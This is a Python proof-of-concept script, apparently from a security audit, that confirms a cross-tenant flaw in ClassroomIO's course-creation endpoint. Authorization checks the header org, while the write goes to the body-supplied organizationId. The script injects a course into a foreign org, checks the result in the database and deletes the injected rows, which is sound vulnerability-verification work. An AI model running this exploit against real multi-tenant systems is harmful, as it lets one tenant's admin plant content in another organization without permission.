#!/usr/bin/env python3
"""
VULN-023 (F-43) — Course create writes the body-supplied `organizationId`
                  (destination-org taken from the body, not the authorized org).

Vulnerable code (targets/classroomio/):
  * route:   apps/api/src/routes/course/course.ts:138  POST /course
             (authMiddleware, orgAdminMiddleware) -> createCourse(user.id, validatedData).
  * authz:   apps/api/src/middlewares/org-admin.ts:28-43 checks ADMIN role against the
             `cio-org-id` HEADER org only.
  * sink:    packages/core/src/services/course/course.ts:294-300
             createGroup({ ..., organizationId: data.organizationId }, tx)  — BODY value.
  * schema:  packages/utils/src/validation/course/course.ts:305-309
             ZCourseCreateBase.organizationId = z.string().min(1)  — any non-empty string;
             never compared to the authorized header org.

Class: CWE-639 IDOR / CWE-915 mass-assignment (destination scope from client body).

Flaw: authorization is proven for the header org A while the write lands in whatever
org the body names. In cloud/multi-org an admin of A sets body organizationId=B and
injects a course+group into victim org B's catalog.

This deployment: assumed single-org, but there IS a second org here, so we test both:
  Test A (always): body organizationId != header org is NOT rejected by validation or
    authz — it reaches the DB, where only the FK to organization.id can stop a bogus id.
  Test B (if a foreign org exists): inject a course into that foreign org (which the
    admin is NOT a member of) and verify group.organization_id == the foreign org.

Success: Test A proves the code reads the body org (validation/authz accept the
mismatch); Test B, when a real foreign org is present, proves live cross-tenant
course injection. Injected rows are cleaned up.
"""
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, admin_login, psql, rid, ORG_ID, ADMIN_USER_ID  # noqa: E402

VULN = "VULN-023"
HERE = os.path.dirname(os.path.abspath(__file__))


def course_body(org_id):
    return {"title": f"inj-{rid('c')}", "description": "cross-tenant inject probe",
            "type": "SELF_PACED", "organizationId": org_id}


def delete_course(course_id, group_id):
    if course_id:
        psql(f"delete from course_newsfeed where course_id='{course_id}';")
        psql(f"delete from course where id='{course_id}';")
    if group_id:
        psql(f"delete from groupmember where group_id='{group_id}';")
        psql(f"delete from \"group\" where id='{group_id}';")


def main():
    banner(VULN, "POST /course writes body organizationId (cross-tenant course injection)")
    admin = admin_login()
    log("SETUP", f"admin authorized in header org {ORG_ID}; orgRoles={admin.org_roles()}")

    random_org = str(uuid.uuid4())
    victim = psql(f"select id from organization where id <> '{ORG_ID}' limit 1;")
    victim = victim.strip() if victim else None
    if victim:
        member = psql(f"select count(*) from organizationmember where organization_id='{victim}' "
                      f"and profile_id='{ADMIN_USER_ID}';")
        log("SETUP", f"found FOREIGN org {victim}; admin membership rows there = {member} (0 == not a member)")

    results = {}

    # --- Test A: body org != header org — passes validation + authz ----------
    log("STEP", f"Test A: POST /course  header cio-org-id={ORG_ID[:8]}..  body organizationId={random_org} (bogus)")
    ra = admin.post("/course", org=True, org_id=ORG_ID, json=course_body(random_org))
    log("INFO", f"  -> HTTP {ra.status_code}  {ra.text[:180]}")
    results["A_bogus_body_org"] = ra.status_code
    # not 400 (zod accepted the mismatched org) and not 403 (authz passed on header)
    a_reached_db = ra.status_code not in (400, 403)
    if a_reached_db:
        log("PROOF", f"body organizationId != header org was NOT rejected by zod(400)/authz(403); it reached "
                     f"the DB (HTTP {ra.status_code}) — only the FK to organization.id stops a bogus id")

    # --- Contrast: authorization is anchored to the HEADER org ---------------
    log("STEP", f"contrast: POST /course with HEADER cio-org-id={random_org} (not my org) → expect 403")
    rc = admin.post("/course", org=True, org_id=random_org, json=course_body(ORG_ID))
    log("INFO", f"  -> HTTP {rc.status_code}  {rc.text[:120]}")
    results["contrast_bogus_header"] = rc.status_code
    authz_on_header = rc.status_code == 403

    # --- Test B: real cross-tenant injection into the foreign org ------------
    confirmed_xtenant = False
    inj_group = inj_course = None
    if victim:
        log("STEP", f"Test B: POST /course  header cio-org-id={ORG_ID[:8]}..  body organizationId={victim} (FOREIGN)")
        rb = admin.post("/course", org=True, org_id=ORG_ID, json=course_body(victim))
        log("INFO", f"  -> HTTP {rb.status_code}  {rb.text[:200]}")
        results["B_foreign_body_org"] = rb.status_code
        if rb.status_code in (200, 201):
            data = rb.json().get("data", {})
            inj_course = (data.get("course") or {}).get("id") or (data.get("course") or data).get("id")
            inj_group = data.get("groupId")
            where = psql(f"select organization_id from \"group\" where id='{inj_group}';")
            log("INFO", f"  injected group {inj_group} organization_id = {where!r} (victim={victim})")
            if where and where.strip() == victim:
                log("PROOF", f"a course+group the admin created landed in FOREIGN org {victim}, which the admin "
                             f"is NOT a member of → live cross-tenant course injection (authz on header {ORG_ID[:8]}.., "
                             f"write into body org)")
                confirmed_xtenant = True
            log("STEP", "cleanup: deleting the injected course/group from the foreign org")
            delete_course(inj_course, inj_group)
            left = psql(f"select count(*) from \"group\" where id='{inj_group}';")
            log("INFO", f"  post-cleanup group rows for injected id = {left}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"Test A (bogus body org, header=my org): HTTP {results.get('A_bogus_body_org')}\n{ra.text}\n\n")
        f.write(f"Contrast (bogus HEADER org): HTTP {results.get('contrast_bogus_header')}\n{rc.text}\n\n")
        if victim:
            f.write(f"Test B (FOREIGN body org {victim}): HTTP {results.get('B_foreign_body_org')}\n")
            f.write(f"  injected group.organization_id == victim: {confirmed_xtenant}\n")
            f.write(f"  (injected course={inj_course} group={inj_group} deleted after verification)\n")
        else:
            f.write("Test B skipped: no foreign org present at runtime.\n")

    # --- Verdict -------------------------------------------------------------
    if confirmed_xtenant:
        verdict(VULN, "CONFIRMED",
                f"admin of {ORG_ID[:8]}.. injected a course into FOREIGN org {victim[:8]}.. via body organizationId "
                f"(authz is header-only); injected rows cleaned up")
        log("OK", "live cross-tenant course injection confirmed")
        sys.exit(0)

    if a_reached_db and authz_on_header:
        verdict(VULN, "CONFIRMED",
                "code reads body organizationId: mismatched body org passes validation+authz and reaches the DB "
                "(only the FK blocks a bogus id); cross-tenant write needs a co-tenant org id (NEEDS_MANUAL in cloud)")
        log("OK", "confirmed the destination-org-from-body defect; see writeup.md")
        sys.exit(0)

    verdict(VULN, "NEEDS_MANUAL", f"results={results} a_reached_db={a_reached_db} authz_on_header={authz_on_header}")
    sys.exit(0)


if __name__ == "__main__":
    main()
